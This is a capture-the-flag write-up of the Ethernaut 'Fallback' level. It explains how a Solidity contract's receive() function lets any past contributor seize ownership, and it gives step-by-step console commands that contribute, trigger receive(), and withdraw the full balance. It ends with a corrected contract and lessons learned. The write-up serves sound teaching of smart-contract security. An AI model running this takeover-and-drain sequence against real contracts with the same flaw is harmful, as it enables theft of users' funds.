# 01 - Fallback

## Goal

The goal of this level is to take ownership of the contract and reduce its balance to `0`.

In simple words:

```text
Become the owner
↓
Withdraw all ETH from the contract
↓
Contract balance becomes 0
↓
Submit the level instance
```

## Contract Overview

The contract stores contributions for each address:

```solidity
mapping(address => uint256) public contributions;
```

It also stores the owner:

```solidity
address public owner;
```

When the contract is deployed, the deployer becomes the owner:

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}
```

So at deployment:

```text
owner = deployer
contributions[deployer] = 1000 ether
```

The contract has three important parts:

```text
contribute()
withdraw()
receive()
```

## Interface View

From the browser console, Ethernaut gives us a JavaScript object called:

```js
contract
```

This object is connected to the deployed challenge contract.

Because `owner` is public:

```solidity
address public owner;
```

Solidity automatically creates a getter function.

So we can call:

```js
await contract.owner()
```

Because `contributions` is public:

```solidity
mapping(address => uint256) public contributions;
```

Solidity also creates a getter function:

```js
await contract.contributions(address)
```

The contract also exposes:

```js
await contract.contribute({ value: ... })
await contract.getContribution()
await contract.withdraw()
```

The special function `receive()` is not called by name.

It is triggered by sending ETH directly to the contract.

## Important Functions

The `contribute()` function is:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

This function allows a user to send a small amount of ETH.

The sent ETH is stored in:

```solidity
contributions[msg.sender]
```

Important condition:

```solidity
require(msg.value < 0.001 ether);
```

So the value sent must be less than:

```text
0.001 ether
```

Example valid value:

```text
0.0001 ether
```

The `withdraw()` function is:

```solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

This function sends all ETH stored in the contract to the owner.

But it can only be called by the owner because of:

```solidity
onlyOwner
```

The modifier is:

```solidity
modifier onlyOwner {
    require(msg.sender == owner, "caller is not the owner");
    _;
}
```

This means:

```text
If msg.sender is owner
→ continue

If msg.sender is not owner
→ revert
```

## The Vulnerable receive() Function

The vulnerable function is:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

This function is automatically called when someone sends ETH directly to the contract.

It has two conditions:

```solidity
msg.value > 0
```

The caller must send some ETH.

And:

```solidity
contributions[msg.sender] > 0
```

The caller must already have contributed before.

If both conditions are true, the contract executes:

```solidity
owner = msg.sender;
```

So the sender becomes the new owner.

## Vulnerability

The vulnerability is that ownership can be changed inside `receive()`.

This is dangerous because `receive()` is triggered by a simple ETH transfer.

The attacker only needs to:

```text
Contribute once
↓
Send ETH directly to the contract
↓
receive() runs
↓
owner = attacker
```

The bug is here:

```solidity
owner = msg.sender;
```

A function that only receives ETH should not silently transfer ownership.

## Attack Path

First, the attacker must make their contribution greater than `0`.

They call:

```solidity
contribute()
```

with a small amount of ETH.

Example:

```text
0.0001 ether
```

After this:

```solidity
contributions[attacker] > 0
```

Then the attacker sends ETH directly to the contract.

This does not call `contribute()`.

It triggers:

```solidity
receive()
```

Because:

```solidity
msg.value > 0
contributions[msg.sender] > 0
```

the `require` passes.

Then:

```solidity
owner = msg.sender;
```

The attacker becomes owner.

Finally, the attacker calls:

```solidity
withdraw()
```

Because the attacker is now the owner, the `onlyOwner` modifier passes.

The contract sends its full balance to the attacker.

## Exploit

First, contribute a small amount:

```js
await contract.contribute({
  value: web3.utils.toWei("0.0001", "ether")
})
```

Then check the contribution:

```js
;(await contract.getContribution()).toString()
```

Expected result:

```text
100000000000000
```

This value is in wei.

It means:

```text
0.0001 ether
```

Then send ETH directly to the contract:

```js
await contract.sendTransaction({
  value: web3.utils.toWei("0.0001", "ether")
})
```

This triggers:

```solidity
receive()
```

Then check the owner:

```js
await contract.owner()
```

Expected result:

```text
your player address
```

You can compare with:

```js
player
```

Then withdraw:

```js
await contract.withdraw()
```

## Full Exploit

```js
await contract.contribute({
  value: web3.utils.toWei("0.0001", "ether")
})

;(await contract.getContribution()).toString()

await contract.sendTransaction({
  value: web3.utils.toWei("0.0001", "ether")
})

await contract.owner()

await contract.withdraw()

web3.utils.fromWei(
  await web3.eth.getBalance(contract.address),
  "ether"
)
```

Then submit the level instance in Ethernaut.

## Verification

Check that you are the owner:

```js
await contract.owner()
```

Expected result:

```text
your player address
```

Check the player address:

```js
player
```

The two addresses should be the same.

Then check the contract balance:

```js
web3.utils.fromWei(
  await web3.eth.getBalance(contract.address),
  "ether"
)
```

Expected result:

```text
0
```

Important distinction:

```text
getContribution()
→ reads contributions[msg.sender]
→ this can stay greater than 0

web3.eth.getBalance(contract.address)
→ reads the real ETH balance of the contract
→ this must become 0
```

So after `withdraw()`, it is normal if:

```js
await contract.getContribution()
```

still returns:

```text
100000000000000
```

Because `withdraw()` does not reset the mapping.

It only transfers the contract ETH balance.

## Wei, Gwei, and Ether

Ethereum stores ETH values internally in wei.

```text
1 ether = 1,000,000,000,000,000,000 wei
1 gwei  = 1,000,000,000 wei
```

So:

```text
0.0001 ether = 100000000000000 wei
```

That is why this command:

```js
;(await contract.getContribution()).toString()
```

can return:

```text
100000000000000
```

To convert wei to ether:

```js
web3.utils.fromWei(value, "ether")
```

Example:

```js
web3.utils.fromWei(
  (await contract.getContribution()).toString(),
  "ether"
)
```

Expected result:

```text
0.0001
```

To convert ether to wei before sending ETH:

```js
web3.utils.toWei("0.0001", "ether")
```

This converts:

```text
0.0001 ether
```

into:

```text
100000000000000 wei
```

## Why .toString() Is Used

Solidity returns `uint256` values.

In JavaScript, large Solidity numbers are often returned as special big-number objects.

So this:

```js
await contract.getContribution()
```

may not display like a normal number.

Using:

```js
;(await contract.getContribution()).toString()
```

means:

```text
Take the big Solidity number
↓
Convert it to readable text
```

So the value becomes easy to read in the console.

## Important Solidity Concepts

`msg.sender` is the address calling the contract.

Example:

```solidity
contributions[msg.sender]
```

means:

```text
contributions[caller address]
```

`msg.value` is the amount of ETH sent with the call.

Example:

```solidity
contributions[msg.sender] += msg.value;
```

means:

```text
Add the ETH sent by the caller to their contribution
```

`owner` is a state variable stored in the contract.

Example:

```solidity
owner = msg.sender;
```

means:

```text
The current caller becomes the owner
```

`receive()` is a special function.

It is called automatically when ETH is sent directly to the contract with empty calldata.

It is not called like this:

```js
await contract.receive()
```

Instead, it is triggered like this:

```js
await contract.sendTransaction({
  value: web3.utils.toWei("0.0001", "ether")
})
```

## Impact

An attacker can become the owner of the contract.

Once the attacker is owner, they can call:

```solidity
withdraw()
```

Then the attacker can drain the full contract balance.

The impact is:

```text
Ownership takeover
↓
Unauthorized withdrawal
↓
Contract balance drained
```

## Proposed Solution

The `receive()` function should not change ownership.

The vulnerable version is:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

The dangerous line is:

```solidity
owner = msg.sender;
```

A safer version would only record the ETH received:

```solidity
receive() external payable {
    require(msg.value > 0, "Send ETH");
    contributions[msg.sender] += msg.value;
}
```

Ownership should be changed only through a protected function:

```solidity
function transferOwnership(address newOwner) external onlyOwner {
    require(newOwner != address(0), "Invalid owner");
    owner = newOwner;
}
```

## Fixed Contract Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FixedFallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 ether;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value > 0, "Send ETH");
        contributions[msg.sender] += msg.value;
    }

    receive() external payable {
        require(msg.value > 0, "Send ETH");
        contributions[msg.sender] += msg.value;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
```

## Lesson Learned

Do not put sensitive privilege changes inside `receive()`.

The `receive()` function is an external entry point.

It can be triggered by a simple ETH transfer.

So this is dangerous:

```solidity
receive() external payable {
    owner = msg.sender;
}
```

The main lesson is:

```text
Receiving ETH should not give ownership.
```

Access control must be explicit and protected.

The vulnerability is:

```text
Ownership takeover through receive()
```

The attack is:

```text
contribute with small ETH
↓
send ETH directly
↓
receive() changes owner
↓
call withdraw()
↓
drain contract balance
```
